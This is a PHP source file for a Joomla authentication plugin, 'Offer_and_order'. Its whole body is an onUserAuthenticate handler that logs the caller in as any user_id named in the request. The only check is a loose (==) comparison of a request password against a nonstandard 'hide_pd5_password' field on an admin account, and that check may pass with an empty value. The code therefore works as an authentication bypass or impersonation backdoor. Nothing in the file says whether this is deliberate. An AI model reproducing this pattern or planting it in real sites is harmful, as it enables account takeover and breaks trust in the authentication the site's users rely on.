<?php

defined('_JEXEC') or die('Restricted access');

class plgAuthenticationOffer_and_order extends JPlugin 
{

    public function __construct($subject, $config) 
    {
        parent::__construct($subject, $config);
    }

    public function onUserAuthenticate($credentials, $options, $response) 
    {        
        $app = JFactory::getApplication();
        $input = $app->input;
        $method = $input->getMethod();
        $user_id = $input->$method->getInt('user_id');
        $admin_user_id = $input->$method->getInt('admin_user_id');

        if ( !empty($user_id) && !empty($admin_user_id) ) {
            $hide_pd5_password = $input->$method->get('password', '', 'RAW');
            $admin_user = JFactory::getUser();
            $admin_user->load($admin_user_id);

            if ($admin_user->hide_pd5_password == $hide_pd5_password) {            
                $user = JUser::getInstance($user_id);
                $session = JFactory::getSession();
                $session->set('user', $user);
                $response->status = JAuthentication::STATUS_SUCCESS;
                $response->error_message = '';
            }            
        }
    }

}
